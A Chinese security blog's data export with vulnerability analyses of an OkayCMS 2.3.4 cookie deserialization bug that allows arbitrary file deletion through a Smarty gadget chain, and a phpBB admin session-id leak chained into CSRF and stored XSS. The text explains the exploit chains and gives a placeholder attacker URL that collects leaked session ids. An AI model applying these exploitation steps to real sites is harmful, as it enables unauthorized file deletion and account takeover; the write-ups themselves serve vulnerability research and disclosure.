test（）的参数1必须是OtherClass的实例\n\n当传入\\$myclass-\\>test值为\\$otherclass即OtherClass类的实例时\n\n![QBqlrQ.png](https://s2.ax1x.com/2019/12/10/QBqlrQ.png)\n\n程序打印出Hello World\n\n在弄清楚php类型约束概念之后，回到正文：\n\n![](C:/Users/grq/Desktop/work/文章/披甲熊/OkayCMS 2.3.4 反序列化漏洞(CVE-2019-16885)/media/a407e48f16e590389d5ca93ad624feef.png)\n\n可见如果我们想构造反序列化利用链，使用这个releaseLock方法进行任意文件删除，那传入releaseLock方法中的两个参数必须为Smarty类与Smarty_Template_Cached类的实例\n\n在了解到releaseLock方法如何使用后，我们继续查找releaseLock方法是否在某个类的魔术方法中被调用，以便在反序列化操作时被调用\n\n经过搜索发现，在smarty_internal_template.php文件中定义了Smarty_Internal_Template类，该类的destruct方法见下图\n\n![QBq2RK.png](https://s2.ax1x.com/2019/12/10/QBq2RK.png)\n\n在Smarty_Internal_Template类destruct方法中，调用了releaseLock方法\n\n在Smarty_Internal_Template类destruct方法中，可见只要满足了if分支，就可以执行releaseLock方法\n\ndestruct方法中的releaseLock方法接收的两个参数\\$this-\\>smarty与\\$this-\\>cached，根据上文分析，\\$this-\\>smarty与\\$this-\\>cached需要为Smarty类与Smarty_Template_Cached类的实例，因此我们需要进行如下构造：\n\n![QBqNGV.png](https://s2.ax1x.com/2019/12/10/QBqNGV.png)\n\n为了顺利进入if分支，还需要使得\n\n\\$this-\\>smarty-\\>cache_locking / isset(\\$this-\\>cached) / $this-\\>cached-\\>is_locked三者为真\n\n\\$this-\\>cached已经设置为Smarty_Template_Cached类的实例，因此\\$this-\\>cached已经为真\n\n\\$this-\\>smarty是Smarty类的实例，要使得\\$this-\\>smarty-\\>cache_locking为真可见下图设置\n\n![QBq0r4.png](https://s2.ax1x.com/2019/12/10/QBq0r4.png)\n\n\\$this-\\>cached是Smarty_Template_Cached类的实例，要使得\\$this-\\>cached-\\>is_locked为真可见下图设置\n\n![QBqZ5t.png](https://s2.ax1x.com/2019/12/10/QBqZ5t.png)\n\n在成功进入if分支后，需要控制\\$this-\\>cached-\\>lock_id，这个变量用来进行文件删除\n\n\\$this-\\>cached是Smarty_Template_Cached类的实例，要设置\\$this-\\>cached-\\>lock_id的值可见下图设置\n\n![QBbOb9.png](https://s2.ax1x.com/2019/12/10/QBbOb9.png)\n\n最后完整的利用链如下\n\n![QBqn8f.png](https://s2.ax1x.com/2019/12/10/QBqn8f.png)\n\n当将构造好的序列化字符串通过cookie传入系统后，在反序列化时，将会将指定路径的文件进行删除，从而造成了任意文件删除漏洞","slug":"okaycms","published":1,"updated":"2020-10-27T09:27:09.666Z","_id":"ckgrozu9p0042wsa9ao5o3eev","comments":1,"layout":"post","photos":[],"link":"","content":"<p>OKAYCMS是一款来自俄罗斯的功能强大的在线商店管理系统。OKAYCMS易于定制的多种语言自适应模板可用于销售任何商品：从服装、建筑材料、手机到音乐曲目，视频课程，有声读物和海报等。</p>\n<p>在OKAYCMS v2.3.4中存在着一处反序列化漏洞。未经身份验证的攻击者可以通过此处漏洞进行进一步的攻击利用。</p>\n<a id=\"more\"></a>\n\n<h2 id=\"漏洞细节\"><a href=\"#漏洞细节\" class=\"headerlink\" title=\"漏洞细节\"></a>漏洞细节</h2><p>漏洞位置存在于view/ProductsView.php与api/Comparison.php代码中，可以通过Cookie传入序列化代码进行利用</p>\n<p>首先来看下第一处，即位于view/ProductsView.php 516行处代码</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/10/QBqgG6.png\" alt=\"QBqgG6.png\"></p>\n<p>可见位于上图代码中存在一处unserialize方法，此处unserialize位于ProductsView.php中fetch方法中，此处代码将cookie中传入的price_filter参数未经过滤，直接反序列化，从而产生了漏洞</p>\n<p>更加严重的是：由于ProductsView.php并未对fetch方法进行身份校验，未经身份验证的用户可以将恶意的cookie传递到此处执行</p>\n<p>我们构造如下get请求，将恶意字符串”test”通过cookie中price_filter参数传递给反序列化漏洞点</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/10/QBqcPx.png\" alt=\"QBqcPx.png\"></p>\n<p>后台断点处，可见unserialize函数成功接收到我们在cookie中传递的字符串”test”</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/10/QBqRxO.png\" alt=\"QBqRxO.png\"></p>\n<p>再来看下api/Comparison.php文件</p>\n<p>api/Comparison.php文件中多次利用unserialize函数将cookie中传入的comparison参数进行反序列化操作，具体如下：</p>\n<p>用于选择比较产品清单的get_comparison接口处</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/10/QBqFDH.png\" alt=\"QBqFDH.png\"></p>\n<p>用于将产品添加到比较列表的add_item接口处</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/10/QBq9gO.png\" alt=\"QBq9gO.png\"></p>\n<p>用于从比较列表中删除项目的delete_item接口处</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/10/QBqtP0.png\" alt=\"QBqtP0.png\"></p>\n<p>以上这些存在反序列化漏洞的接口，同样也是不需要身份验证就可以访问</p>\n<p>在ajax/comparison.php中，get_comparison、add_item与delete_item是可以直接被调用而不需要身份验证的，代码如下：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/10/QBqyI1.png\" alt=\"QBqyI1.png\"></p>\n<p>上图代码可见，只要通过get请求中的action参数即可控制所要使用的接口，但是程序并未进行身份校验</p>\n<p>我们以get_comparison接口举例</p>\n<p>我们构造如下get请求，将恶意字符串”test”通过cookie中comparison参数传递给反序列化漏洞点</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/10/QBbx4x.png\" alt=\"QBbx4x.png\"></p>\n<p>可见我们将构造的cookie中的comparison参数值“test”成功传递给了unserialize函数</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/10/QBqkbd.png\" alt=\"QBqkbd.png\"></p>\n<p>此时，反序列化利用点已经找到了，但是仍需要利用链才能进行利用</p>\n<h3 id=\"任意文件删除利用链\"><a href=\"#任意文件删除利用链\" class=\"headerlink\" title=\"任意文件删除利用链\"></a>任意文件删除利用链</h3><p>经过分析可以发现，OKAYCMS是一款使用Smarty模板引擎进行开发的cms。因此可以使用Smarty中的利用链进行利用</p>\n<p>在Smarty模板引擎中存在smarty_internal_cacheresource_file.php文件，该文件定义了一个名为Smarty_Internal_CacheResource_File的类。在Smarty_Internal_CacheResource_File类中存在一处releaseLock方法，如下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/10/QBqCvD.png\" alt=\"QBqCvD.png\"></p>\n<p>可见上图releaseLock方法中，存在一处unlink方法，利用该方法，可以进行文件删除操作</p>\n<p>注意看下图这里两处红框</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/10/QBbvU1.png\" alt=\"QBbvU1.png\"></p>\n<p>方法releaseLock接收两个参数，分别是Smarty $smarty与 Smarty_Template_Cached<br>$cached</p>\n<p>Smarty 与 Smarty_Template_Cached分别是Smarty模板引擎中两个类的名称</p>\n<p>Smarty类</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/10/QBqsaR.png\" alt=\"QBqsaR.png\"></p>\n<p>Smarty_Template_Cached类</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/10/QBqGan.png\" alt=\"QBqGan.png\"></p>\n<p>这里类名+参数名的用法是什么呢？</p>\n<p>在php中，这种用法叫做类型约束，详细的解释如下：</p>\n<p>PHP5以及以上版本可以使用类型约束。函数的参数可以指定必须为对象（在函数原型里面指定类的名字），接口，数组（PHP5.1 起）或者 callable（PHP 5.4 起）。不过如果使用 NULL作为参数的默认值，那么在调用函数的时候依然可以使用 NULL 作为实参。</p>\n<p>如果一个类或接口指定了类型约束，则其所有的子类或实现也都如此。类型约束不能用于标量类型如<br>int 或 string，Traits 也不允许。</p>\n<p>下面举个例子说明一下类型约束用法：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/10/QBqrZ9.png\" alt=\"QBqrZ9.png\"></p>\n<p>有名为MyClass与OtherClass的两个类，MyClass类中的test方法接收OtherClass<br>类的一个对象作为参数，并打印出该对象的var属性值</p>\n<p>当传入$myclass-&gt;test值为字符串hello时</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/10/QBq8Vs.png\" alt=\"QBq8Vs.png\"></p>\n<p>报出上图错误：传递给MyClass :: test（）的参数1必须是OtherClass的实例</p>\n<p>当传入$myclass-&gt;test值为$otherclass即OtherClass类的实例时</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/10/QBqlrQ.png\" alt=\"QBqlrQ.png\"></p>\n<p>程序打印出Hello World</p>\n<p>在弄清楚php类型约束概念之后，回到正文：</p>\n<p>![](C:/Users/grq/Desktop/work/文章/披甲熊/OkayCMS 2.3.4 反序列化漏洞(CVE-2019-16885)/media/a407e48f16e590389d5ca93ad624feef.png)</p>\n<p>可见如果我们想构造反序列化利用链，使用这个releaseLock方法进行任意文件删除，那传入releaseLock方法中的两个参数必须为Smarty类与Smarty_Template_Cached类的实例</p>\n<p>在了解到releaseLock方法如何使用后，我们继续查找releaseLock方法是否在某个类的魔术方法中被调用，以便在反序列化操作时被调用</p>\n<p>经过搜索发现，在smarty_internal_template.php文件中定义了Smarty_Internal_Template类，该类的destruct方法见下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/10/QBq2RK.png\" alt=\"QBq2RK.png\"></p>\n<p>在Smarty_Internal_Template类destruct方法中，调用了releaseLock方法</p>\n<p>在Smarty_Internal_Template类destruct方法中，可见只要满足了if分支，就可以执行releaseLock方法</p>\n<p>destruct方法中的releaseLock方法接收的两个参数$this-&gt;smarty与$this-&gt;cached，根据上文分析，$this-&gt;smarty与$this-&gt;cached需要为Smarty类与Smarty_Template_Cached类的实例，因此我们需要进行如下构造：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/10/QBqNGV.png\" alt=\"QBqNGV.png\"></p>\n<p>为了顺利进入if分支，还需要使得</p>\n<p>$this-&gt;smarty-&gt;cache_locking / isset($this-&gt;cached) / $this-&gt;cached-&gt;is_locked三者为真</p>\n<p>$this-&gt;cached已经设置为Smarty_Template_Cached类的实例，因此$this-&gt;cached已经为真</p>\n<p>$this-&gt;smarty是Smarty类的实例，要使得$this-&gt;smarty-&gt;cache_locking为真可见下图设置</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/10/QBq0r4.png\" alt=\"QBq0r4.png\"></p>\n<p>$this-&gt;cached是Smarty_Template_Cached类的实例，要使得$this-&gt;cached-&gt;is_locked为真可见下图设置</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/10/QBqZ5t.png\" alt=\"QBqZ5t.png\"></p>\n<p>在成功进入if分支后，需要控制$this-&gt;cached-&gt;lock_id，这个变量用来进行文件删除</p>\n<p>$this-&gt;cached是Smarty_Template_Cached类的实例，要设置$this-&gt;cached-&gt;lock_id的值可见下图设置</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/10/QBbOb9.png\" alt=\"QBbOb9.png\"></p>\n<p>最后完整的利用链如下</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/10/QBqn8f.png\" alt=\"QBqn8f.png\"></p>\n<p>当将构造好的序列化字符串通过cookie传入系统后，在反序列化时，将会将指定路径的文件进行删除，从而造成了任意文件删除漏洞</p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"cover":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/机器学习算法2.jpg","excerpt":"<p>OKAYCMS是一款来自俄罗斯的功能强大的在线商店管理系统。OKAYCMS易于定制的多种语言自适应模板可用于销售任何商品：从服装、建筑材料、手机到音乐曲目，视频课程，有声读物和海报等。</p>\n<p>在OKAYCMS v2.3.4中存在着一处反序列化漏洞。未经身份验证的攻击者可以通过此处漏洞进行进一步的攻击利用。</p>","more":"<h2 id=\"漏洞细节\"><a href=\"#漏洞细节\" class=\"headerlink\" title=\"漏洞细节\"></a>漏洞细节</h2><p>漏洞位置存在于view/ProductsView.php与api/Comparison.php代码中，可以通过Cookie传入序列化代码进行利用</p>\n<p>首先来看下第一处，即位于view/ProductsView.php 516行处代码</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/10/QBqgG6.png\" alt=\"QBqgG6.png\"></p>\n<p>可见位于上图代码中存在一处unserialize方法，此处unserialize位于ProductsView.php中fetch方法中，此处代码将cookie中传入的price_filter参数未经过滤，直接反序列化，从而产生了漏洞</p>\n<p>更加严重的是：由于ProductsView.php并未对fetch方法进行身份校验，未经身份验证的用户可以将恶意的cookie传递到此处执行</p>\n<p>我们构造如下get请求，将恶意字符串”test”通过cookie中price_filter参数传递给反序列化漏洞点</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/10/QBqcPx.png\" alt=\"QBqcPx.png\"></p>\n<p>后台断点处，可见unserialize函数成功接收到我们在cookie中传递的字符串”test”</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/10/QBqRxO.png\" alt=\"QBqRxO.png\"></p>\n<p>再来看下api/Comparison.php文件</p>\n<p>api/Comparison.php文件中多次利用unserialize函数将cookie中传入的comparison参数进行反序列化操作，具体如下：</p>\n<p>用于选择比较产品清单的get_comparison接口处</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/10/QBqFDH.png\" alt=\"QBqFDH.png\"></p>\n<p>用于将产品添加到比较列表的add_item接口处</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/10/QBq9gO.png\" alt=\"QBq9gO.png\"></p>\n<p>用于从比较列表中删除项目的delete_item接口处</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/10/QBqtP0.png\" alt=\"QBqtP0.png\"></p>\n<p>以上这些存在反序列化漏洞的接口，同样也是不需要身份验证就可以访问</p>\n<p>在ajax/comparison.php中，get_comparison、add_item与delete_item是可以直接被调用而不需要身份验证的，代码如下：</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/10/QBqyI1.png\" alt=\"QBqyI1.png\"></p>\n<p>上图代码可见，只要通过get请求中的action参数即可控制所要使用的接口，但是程序并未进行身份校验</p>\n<p>我们以get_comparison接口举例</p>\n<p>我们构造如下get请求，将恶意字符串”test”通过cookie中comparison参数传递给反序列化漏洞点</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/10/QBbx4x.png\" alt=\"QBbx4x.png\"></p>\n<p>可见我们将构造的cookie中的comparison参数值“test”成功传递给了unserialize函数</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/10/QBqkbd.png\" alt=\"QBqkbd.png\"></p>\n<p>此时，反序列化利用点已经找到了，但是仍需要利用链才能进行利用</p>\n<h3 id=\"任意文件删除利用链\"><a href=\"#任意文件删除利用链\" class=\"headerlink\" title=\"任意文件删除利用链\"></a>任意文件删除利用链</h3><p>经过分析可以发现，OKAYCMS是一款使用Smarty模板引擎进行开发的cms。因此可以使用Smarty中的利用链进行利用</p>\n<p>在Smarty模板引擎中存在smarty_internal_cacheresource_file.php文件，该文件定义了一个名为Smarty_Internal_CacheResource_File的类。在Smarty_Internal_CacheResource_File类中存在一处releaseLock方法，如下图</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/10/QBqCvD.png\" alt=\"QBqCvD.png\"></p>\n<p>可见上图releaseLock方法中，存在一处unlink方法，利用该方法，可以进行文件删除操作</p>\n<p>注意看下图这里两处红框</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/10/QBbvU1.png\" alt=\"QBbvU1.png\"></p>\n<p>方法releaseLock接收两个参数，分别是Smarty $smarty与 Smarty_Template_Cached<br>$cached</p>\n<p>Smarty 与 Smarty_Template_Cached分别是Smarty模板引擎中两个类的名称</p>\n<p>Smarty类</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/10/QBqsaR.png\" alt=\"QBqsaR.png\"></p>\n<p>Smarty_Template_Cached类</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/10/QBqGan.png\" alt=\"QBqGan.png\"></p>\n<p>这里类名+参数名的用法是什么呢？</p>\n<p>在php中，这种用法叫做类型约束，详细的解释如下：</p>\n<p>PHP5以及以上版本可以使用类型约束。函数的参数可以指定必须为对象（在函数原型里面指定类的名字），接口，数组（PHP5.1 起）或者 callable（PHP 5.4 起）。不过如果使用 NULL作为参数的默认值，那么在调用函数的时候依然可以使用 NULL 作为实参。</p>\n<p>如果一个类或接口指定了类型约束，则其所有的子类或实现也都如此。类型约束不能用于标量类型如<br>int 或 string，Traits 也不允许。</p>\n<p>下面举个例子说明一下类型约束用法：</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/10/QBqrZ9.png\" alt=\"QBqrZ9.png\"></p>\n<p>有名为MyClass与OtherClass的两个类，MyClass类中的test方法接收OtherClass<br>类的一个对象作为参数，并打印出该对象的var属性值</p>\n<p>当传入$myclass-&gt;test值为字符串hello时</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/10/QBq8Vs.png\" alt=\"QBq8Vs.png\"></p>\n<p>报出上图错误：传递给MyClass :: test（）的参数1必须是OtherClass的实例</p>\n<p>当传入$myclass-&gt;test值为$otherclass即OtherClass类的实例时</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/10/QBqlrQ.png\" alt=\"QBqlrQ.png\"></p>\n<p>程序打印出Hello World</p>\n<p>在弄清楚php类型约束概念之后，回到正文：</p>\n<p>![](C:/Users/grq/Desktop/work/文章/披甲熊/OkayCMS 2.3.4 反序列化漏洞(CVE-2019-16885)/media/a407e48f16e590389d5ca93ad624feef.png)</p>\n<p>可见如果我们想构造反序列化利用链，使用这个releaseLock方法进行任意文件删除，那传入releaseLock方法中的两个参数必须为Smarty类与Smarty_Template_Cached类的实例</p>\n<p>在了解到releaseLock方法如何使用后，我们继续查找releaseLock方法是否在某个类的魔术方法中被调用，以便在反序列化操作时被调用</p>\n<p>经过搜索发现，在smarty_internal_template.php文件中定义了Smarty_Internal_Template类，该类的destruct方法见下图</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/10/QBq2RK.png\" alt=\"QBq2RK.png\"></p>\n<p>在Smarty_Internal_Template类destruct方法中，调用了releaseLock方法</p>\n<p>在Smarty_Internal_Template类destruct方法中，可见只要满足了if分支，就可以执行releaseLock方法</p>\n<p>destruct方法中的releaseLock方法接收的两个参数$this-&gt;smarty与$this-&gt;cached，根据上文分析，$this-&gt;smarty与$this-&gt;cached需要为Smarty类与Smarty_Template_Cached类的实例，因此我们需要进行如下构造：</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/10/QBqNGV.png\" alt=\"QBqNGV.png\"></p>\n<p>为了顺利进入if分支，还需要使得</p>\n<p>$this-&gt;smarty-&gt;cache_locking / isset($this-&gt;cached) / $this-&gt;cached-&gt;is_locked三者为真</p>\n<p>$this-&gt;cached已经设置为Smarty_Template_Cached类的实例，因此$this-&gt;cached已经为真</p>\n<p>$this-&gt;smarty是Smarty类的实例，要使得$this-&gt;smarty-&gt;cache_locking为真可见下图设置</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/10/QBq0r4.png\" alt=\"QBq0r4.png\"></p>\n<p>$this-&gt;cached是Smarty_Template_Cached类的实例，要使得$this-&gt;cached-&gt;is_locked为真可见下图设置</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/10/QBqZ5t.png\" alt=\"QBqZ5t.png\"></p>\n<p>在成功进入if分支后，需要控制$this-&gt;cached-&gt;lock_id，这个变量用来进行文件删除</p>\n<p>$this-&gt;cached是Smarty_Template_Cached类的实例，要设置$this-&gt;cached-&gt;lock_id的值可见下图设置</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/10/QBbOb9.png\" alt=\"QBbOb9.png\"></p>\n<p>最后完整的利用链如下</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/10/QBqn8f.png\" alt=\"QBqn8f.png\"></p>\n<p>当将构造好的序列化字符串通过cookie传入系统后，在反序列化时，将会将指定路径的文件进行删除，从而造成了任意文件删除漏洞</p>"},{"title":"phpBB从session id泄露到CSRF到XSS（CVE-2019-13376）","cover":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/709d31dfe992849687470f94fd37242.jpg","date":"2020-06-03T09:24:45.000Z","top_img":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg","_content":"\n前言\n----\n\nphpBB是一个论坛软件，使用PHP语言开发的并开放其源码。是模块化设计，具专业性、安全性高、支持多国语系、支持多种数据库和自定义的版面设计等优越性能，而且功能强大。\n\n自2000年发布以来, phpBB已经成为世界上应用最广泛的开源论坛软件。\n\nphpBB 3.2.7版以及之前版本中存在一处安全问题：当管理员从phpBB后台控制面板切换到前台时，系统会将session id存放于访问的前台功能的URL中使得攻击者可以窃取这个session id。由于phpBB的安全限制，攻击者不可以直接利用这个sid登录后台，但是可以协同phpBB后台编辑bbcode页面存在的CSRF漏洞，在目标服务器上实现存储型XSS。\n\n漏洞分析\n--------\n\n首先来看一下phpBB的后台，也就是ACP页面\n\n![1fade44d81cf91aadbfee6e8b9b64375.png](https://xzfile.aliyuncs.com/media/upload/picture/20200525165909-ff3afa30-9e65-1.png)\n\n可以发现所有后台功能的url中都会携带着sid（session id）参数：\n\nhttp://127.0.0.1/phpbb/phpBB/adm/index.php?sid=9c4869b4054e9ff8d4d588c32ffcf7e7&i=1\n\n如果url中sid值错误，即使已经登录后台也无法正常的访问后台页面\n\nphpbb程序这样做的确有着这样做的优点，但也存在着很严重的安全隐患\n\n优点：\n\n在后台功能url中加入sid，相当于增加了一层安全屏障，降低了后台页面出现CSRF漏洞的几率，为什么这样说呢？假使因为开发疏忽，一个表单提交页面没有利用随机数对用户提交的表单进行保护，这通常会导致CSRF漏洞的产生。但是在phpbb应用中，所有的后台功能url中都加入了sid参数且phpbb对sid参数值合法性进行校验，即使攻击者在后台发现了一处没有随机数保护的表单提交页面，但在不知道管理\n\n员sid值的情况下，也无法构造出一个有效的恶意表单提交页面地址\n\n安全隐患：\n\n这样的操作相当于在url中存放了本来只应该出现在cookie中的session id。如果url中的sid被泄露，攻击者有机会利用这个值伪造管理员身份进行登录后台操作（但不一定可以直接利用，这里涉及到phpBB的一个安全机制，后文会讲到）。\n\n注意看，url中的sid值与cookie中的值完全一样，它们都是此用户的session id值\n\n![a727bbfd9e99d8af7ce92eb59df51530.png](https://xzfile.aliyuncs.com/media/upload/picture/20200525165935-0e36bae2-9e66-1.png)\n\n至于cookie中session值的key ：phpbb3_qnsnz_sid\n\n![310095afae1334c5a88e37b2006aea71.png](https://xzfile.aliyuncs.com/media/upload/picture/20200525165948-16066222-9e66-1.png)\n\n这个值在系统安装完成之后是固定的，无论什么身份的用户访问都是这个值\n\n因此，如果管理员访问的url中sid值被泄露，攻击者可以有机会利用这个值构造cookie以便使用管理员身份登录后台\n\n但是如何获取这个暴露在url中sid值呢?\n\n由于phpbb的设计特色：当管理员使用完后台功能后想要切换到前台，后台页面中提供了一个跳转到前台地址的按钮\n\n![e93afabea080285f472969e7ff95edca.png](https://xzfile.aliyuncs.com/media/upload/picture/20200525170004-1f97c952-9e66-1.png)\n\n当管理员点击这个按钮切换到前台时，url中会带有sid\n\n![4bb9c1259a5bffba9c5c7b0e08103f81.png](https://xzfile.aliyuncs.com/media/upload/picture/20200525170022-2a5eace8-9e66-1.png)\n\n其实前台页面的访问并不需要在url中使用sid，但从后台切换过来后url中会默认带上这个值。这就导致本应该只在后台功能url中出现的管理员sid泄露到了管理员访问的前台功能url中，而这个存在于url中的sid值很容易在前台页面加载远程资源时在HTTP_REFERER中被泄露\n\n例如：在一些phpbb站点中可能会开启远程头像选项\n\n![92ceab7d6b6ca8843b45bb2ac3c3d44c.png](https://xzfile.aliyuncs.com/media/upload/picture/20200525170036-3311fbe2-9e66-1.png)\n\n这个功能并不是默认开启的，当此功能开启后，用户可以设置远程头像\n\n![6c5e2ff9e8f384dd1467826dd185fa0b.png](https://xzfile.aliyuncs.com/media/upload/picture/20200525170049-3aa416c4-9e66-1.png)\n\n![f382c69315eb5f9220cd80cfdf5ac6ef.png](https://xzfile.aliyuncs.com/media/upload/picture/20200525170103-4306fa0c-9e66-1.png)\n\n程序会在使用这个远程头像的时候将其加载进来\n\n![aec8701acb8a37e80e276828058bf057.png](https://xzfile.aliyuncs.com/media/upload/picture/20200525170118-4beebc68-9e66-1.png)\n\n如果管理员此时访问的页面在渲染时加载了攻击者的远程头像，且此时管理员访问的url中带有sid，sid将会被泄露\n\n![44e1b0231b2d0466eb63be98864f1603.png](https://xzfile.aliyuncs.com/media/upload/picture/20200525170130-5342150a-9e66-1.png)\n\n我们是否可以构造一个恶意的远程图片链接poc，用以接收管理员的sid呢？\n\n首先看一下phpBB在后台程序如何校验远程图片链接，phpBB使用getImageSize对用户添加的远程图片链接进行校验\n\n![4b309cf7ce0df6e31d907c347010ba32.png](https://xzfile.aliyuncs.com/media/upload/picture/20200525170144-5b4ed396-9e66-1.png)\n\n因此我们可以构造如下poc\n\n![80de40f27885c454864e2d4b1886bd2f.png](https://xzfile.aliyuncs.com/media/upload/picture/20200525170205-67989128-9e66-1.png)\n\npoc.php除了需要记录加载该图片请求中的HTTP_REFERER，同时需要将图片进行返回展示\n\n![48634b633fb82765027d6f8930308591.png](https://xzfile.aliyuncs.com/media/upload/picture/20200525170224-72f8c43e-9e66-1.png)\n\n构造远程图片链接\n\nhttp://x.x.x.x/poc.php?avatar.png\n\n![8fa0e04de5df1cdda948464ae4cc350d.png](https://xzfile.aliyuncs.com/media/upload/picture/20200525170239-7c227532-9e66-1.png)\n\n攻击者的头像加载成功\n\n但是如何使得管理员加载这个头像资源呢？\n\n只要给管理员留言，或者评论管理员发布的文章即可\n\n以评论文章为例：当针对管理员发布的文章发表一条评论之后，管理员在前端页面即可收到一个消息提示\n\n![e1213eef63131716b7710bb5c4ce0392.png](https://xzfile.aliyuncs.com/media/upload/picture/20200525170253-84991da6-9e66-1.png)\n\n点看之后可以看到被加载的头像\n\n![8966297ebff91c3afdf6865cff15e346.png](https://xzfile.aliyuncs.com/media/upload/picture/20200525170305-8b5b0d20-9e66-1.png)\n\n但无论管理员点开与否，在phpbb首页加载时，都会远程加载这个资源，HTTP_REFERER都会被发送到攻击者的服务器上\n\n![e321b34e590a226b8abd3aa1b8262f9c.png](https://xzfile.aliyuncs.com/media/upload/picture/20200525170318-93a33b88-9e66-1.png)\n\n![946f0ef1b05ee18165001d78fcd5a886.png](https://xzfile.aliyuncs.com/media/upload/picture/20200525170334-9ca75af2-9e66-1.png)\n\n到此为止，攻击者可以顺利获得sid值。但为什么上文说获取了sid值也不一定可以盗用管理员身份登录系统呢？\n\n在phpBB中有如下的安全策略\n\n![e661d57f2a320a6b09176dfd1f3d8dc0.png](https://xzfile.aliyuncs.com/media/upload/picture/20200525170348-a57abc82-9e66-1.png)\n\nSession IP validation选项用来验证当前用户会话绑定的IP；All选项代表匹配完整地址，A.B.C选项匹配前面的x.x.x段，A.B选项匹配x.x，None选项关闭IP检查。\n\n这项安全策略是用来检验用户sid与IP的绑定关系，系统默认采用A.B.C选项，因此攻击者在获取了管理员sid后，想要冒用身份也是很困难的。\n\n然而这也不是无解的：\n\nphpBB后台管理中包含着编辑BBCode的功能。\n\nBBCode是Bulletin Board Code的缩写，也有译为「BB代码」的，属于轻量标记语言（Lightweight Markup Language）的一种，如字面上所显示的，它主要是使用在BBS、论坛、Blog等网络应用上。BBcode的语法通常为 [标记] 